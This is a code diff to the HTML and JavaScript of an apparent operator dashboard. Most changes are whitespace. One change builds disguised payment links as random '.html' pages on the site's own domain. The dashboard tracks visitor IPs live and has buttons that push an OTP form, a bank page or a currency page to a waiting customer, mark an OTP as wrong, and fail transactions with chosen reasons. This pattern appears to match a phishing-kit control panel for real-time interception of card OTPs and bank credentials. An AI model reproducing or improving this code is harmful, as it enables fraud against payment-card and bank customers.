@@ -35,11 +35,11 @@
     .show-otp-btn:disabled { background: #666; }
     .wrong-otp-btn { background: #ef4444; }
     .wrong-otp-btn:hover { background: #dc2626; }
-    .reason-dropdown { 
-      background: #333; 
-      color: #fff; 
-      border: 1px solid #555; 
-      padding: 4px 8px; 
+    .reason-dropdown {
+      background: #333;
+      color: #fff;
+      border: 1px solid #555;
+      padding: 4px 8px;
       border-radius: 4px;
       width: 100%;
       margin-bottom: 5px;
@@ -157,7 +157,7 @@
       0% { transform: translateX(100%); opacity: 0; }
       100% { transform: translateX(0); opacity: 1; }
     }
-    
+
     /* Currency button style */
     .currency-btn {
       width: 100%;
@@ -251,7 +251,7 @@
       const element = document.getElementById(type === 'error' ? 'error-msg' : 'success-msg');
       element.textContent = message;
       element.style.display = 'block';
-      
+
       // Auto hide after duration
       setTimeout(() => {
         element.style.display = 'none';
@@ -264,7 +264,7 @@
       notification.className = 'notification';
       notification.textContent = message;
       document.body.appendChild(notification);
-      
+
       // Auto remove after duration
       setTimeout(() => {
         notification.style.opacity = '0';
@@ -278,14 +278,14 @@
       try {
         console.log('Loading visitors from server...');
         const response = await fetch('/api/visitors');
-        
+
         if (!response.ok) {
           throw new Error(`Failed to load visitors: ${response.status}`);
         }
-        
+
         const data = await response.json();
         console.log('Visitor data received:', data);
-        
+
         updateVisitorsList(data);
       } catch (error) {
         console.error('Error loading visitors:', error);
@@ -295,29 +295,29 @@
     // Update visitors list
     function updateVisitorsList(visitors) {
       const visitorsList = document.getElementById('visitors-list');
-      
+
       // Clear existing list first
       visitorsList.innerHTML = '';
-      
+
       if (!visitors || visitors.length === 0) {
         visitorsList.innerHTML = '<p>No visitors yet</p>';
         return;
       }
-      
+
       // Sort visitors by timestamp (newest first)
       visitors.sort((a, b) => {
         return new Date(b.timestamp) - new Date(a.timestamp);
       });
-      
+
       // Add each visitor to the list
       visitors.forEach(visitor => {
         // Store in map for reference
         visitorsMap.set(visitor.pid, visitor);
-        
+
         // Add to DOM
         addVisitorToList(visitor, false);
       });
-      
+
       console.log(`Updated visitors list with ${visitors.length} visitors`);
     }
 
@@ -327,27 +327,27 @@
         console.error('Invalid visitor data:', visitor);
         return;
       }
-      
+
       const visitorsList = document.getElementById('visitors-list');
-      
+
       // Check if this visitor is already in the list
       const existingItem = document.getElementById(`visitor-${visitor.pid}`);
       if (existingItem && !isNew) {
         return; // Skip if already exists and not new
       }
-      
+
       // Create visitor item
       const visitorItem = document.createElement('div');
       visitorItem.className = isNew ? 'visitor-item new' : 'visitor-item';
       visitorItem.id = `visitor-${visitor.pid}`;
-      
+
       visitorItem.innerHTML = `
         <span class="visitor-badge">VISITOR</span>
         <span class="ip-address">${visitor.ip || 'Unknown'}</span>
         <span>Payment ID: ${visitor.pid}</span>
         <span class="visitor-time">${visitor.timestamp}</span>
       `;
-      
+
       // Add to list (at beginning for new visitors)
       if (isNew && visitorsList.firstChild) {
         visitorsList.insertBefore(visitorItem, visitorsList.firstChild);
@@ -356,7 +356,7 @@
         visitorsList.appendChild(visitorItem);
         console.log('Added visitor to list:', visitor.pid);
       }
-      
+
       // Remove "No visitors yet" message if present
       const noVisitorsMsg = visitorsList.querySelector('p');
       if (noVisitorsMsg && noVisitorsMsg.textContent === 'No visitors yet') {
@@ -386,13 +386,10 @@
         generateBtn.disabled = true;
         generateLoader.classList.remove('hidden');
         linkContainer.style.display = 'none';
-        
+
         const amount = parseFloat(amountInput.value);
         const description = descInput.value.trim();
 
-        // Generate a random hash for the URL
-        const randomHash = Math.random().toString(36).substring(2, 10);
-        
         const response = await fetch('/api/generatePaymentLink', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -400,25 +397,19 @@
         });
 
         const data = await response.json();
-        
+
         // Reset loading state
         generateBtn.disabled = false;
         generateLoader.classList.add('hidden');
-        
+
         if (!response.ok) {
           throw new Error(data.message || 'Failed to generate payment link');
         }
 
-        // Create custom payment link using the original pid but with our custom format
-        const originalUrl = new URL(data.paymentLink);
-        const pid = originalUrl.searchParams.get('pid');
-        const host = originalUrl.host;
-        const protocol = originalUrl.protocol;
-
-        // Format with random hash
-        const customPaymentLink = `${protocol}//${host}/${randomHash}.html?pid=${pid}`;
-        
-        document.getElementById('paymentLink').textContent = customPaymentLink;
+        // Display the payment link in randomhash.html format instead of pay.my domain
+        const origin = window.location.origin;
+        const paymentLink = `${origin}/${data.paymentId}.html`;
+        document.getElementById('paymentLink').textContent = paymentLink;
         linkContainer.style.display = 'block';
         showMessage('success', 'Payment link generated successfully!');
       } catch (error) {
@@ -450,17 +441,17 @@
       try {
         const tbody = document.querySelector("#transactionsTable tbody");
         const loadingIndicator = document.getElementById('transactionsLoading');
-        
+
         loadingIndicator.style.display = 'block';
-        
+
         const response = await fetch("/api/transactions");
-        
+
         if (!response.ok) {
           throw new Error('Failed to load transactions');
         }
-        
+
         const data = await response.json();
-        
+
         // Hide loading indicator and show table
         loadingIndicator.style.display = 'none';
         tbody.innerHTML = '';
@@ -544,12 +535,12 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id, redirectStatus: status })
         });
-        
+
         if (!response.ok) {
           const data = await response.json();
           throw new Error(data.message || 'Failed to update status');
         }
-        
+
         showMessage('success', `Transaction marked as ${status}`);
         loadTransactions();
       } catch (error) {
@@ -562,18 +553,18 @@
       try {
         const reasonSelect = document.getElementById(`reason-${id}`);
         const failureReason = reasonSelect.value;
-        
+
         const response = await fetch("/api/updateRedirectStatus", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id, redirectStatus: status, failureReason })
         });
-        
+
         if (!response.ok) {
           const data = await response.json();
           throw new Error(data.message || 'Failed to update status with reason');
         }
-        
+
         showMessage('success', `Transaction marked as failed with reason: ${getReadableReason(failureReason)}`);
         loadTransactions();
       } catch (error) {
@@ -586,24 +577,24 @@
     async function showCurrencyPage(id) {
       const transaction = transactionsMap.get(id);
       if (!transaction) return;
-      
+
       try {
         // Get the pid from the transaction
         const response = await fetch(`/api/getTransactionPid?invoiceId=${id}`);
         if (!response.ok) {
           throw new Error('Failed to get payment details');
         }
-        
+
         const data = await response.json();
         if (!data.pid) {
           throw new Error('No payment ID found');
         }
-        
+
         // Emit socket event to redirect the user
-        io.to(id).emit('redirect_to_currency', { 
-          redirectUrl: `/currencypayment.html?pid=${data.pid}` 
+        io.to(id).emit('redirect_to_currency', {
+          redirectUrl: `/currencypayment.html?pid=${data.pid}`
         });
-        
+
         showMessage('success', 'Currency page shown to customer');
       } catch (error) {
         console.error('Error showing currency page:', error);
@@ -629,12 +620,12 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-        
+
         if (!response.ok) {
           const data = await response.json();
           throw new Error(data.message || 'Failed to show OTP');
         }
-        
+
         showMessage('success', 'OTP form shown to customer');
         loadTransactions();
       } catch (error) {
@@ -650,12 +641,12 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-        
+
         if (!response.ok) {
           const data = await response.json();
           throw new Error(data.message || 'Failed to mark OTP as wrong');
         }
-        
+
         showMessage('success', 'OTP marked as incorrect');
         loadTransactions();
       } catch (error) {
@@ -685,12 +676,12 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-        
+
         if (!response.ok) {
           const data = await response.json();
           throw new Error(data.message || 'Failed to show bank page');
         }
-        
+
         showMessage('success', 'Bank page shown to customer');
         loadTransactions();
       } catch (error) {
@@ -706,12 +697,12 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ invoiceId: id })
         });
-        
+
         if (!response.ok) {
           const data = await response.json();
           throw new Error(data.message || 'Failed to hide bank page');
         }
-        
+
         showMessage('success', 'Bank page hidden');
         loadTransactions();
       } catch (error) {
@@ -734,20 +725,20 @@
     socket.on('new_transaction', () => {
       loadTransactions();
     });
-    
+
     // Handle visitor notifications
     socket.on('visitor', (visitor) => {
       console.log('New visitor detected:', visitor);
-      
+
       // Add visitor to map
       visitorsMap.set(visitor.pid, visitor);
-      
+
       // Add to list with highlight animation
       addVisitorToList(visitor, true);
-      
+
       // Show notification
       showNotification(`New visitor from IP: ${visitor.ip || 'Unknown'}`);
-      
+
       // Play notification sound
       try {
         const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3');
@@ -756,21 +747,21 @@
         console.log('Could not play notification sound', e);
       }
     });
-    
+
     // Handle when visitors leave
     socket.on('visitor_left', (data) => {
       console.log('Visitor left:', data.pid);
-      
+
       // Remove from map
       visitorsMap.delete(data.pid);
-      
+
       // Remove from display with animation
       const visitorElement = document.getElementById(`visitor-${data.pid}`);
       if (visitorElement) {
         visitorElement.classList.add('fade-out');
         setTimeout(() => {
           visitorElement.remove();
-          
+
           // Show "No visitors yet" message if this was the last visitor
           const visitorsList = document.getElementById('visitors-list');
           if (visitorsList.children.length === 0) {
@@ -778,11 +769,11 @@
           }
         }, 500);
       }
-      
+
       // Show notification
       showNotification(`Visitor has left`);
     });
-    
+
     // Handle existing visitors when reconnecting
     socket.on('existing_visitors', (visitors) => {
       console.log('Received existing visitors:', visitors);
@@ -794,7 +785,7 @@
       console.log('DOM loaded, initializing visitor tracking');
       loadVisitors();
       loadTransactions();
-      
+
       // Set up refresh intervals
       setInterval(loadVisitors, 10000); // Check for visitors every 10 seconds
       setInterval(loadTransactions, 10000); // Refresh transactions every 10 seconds
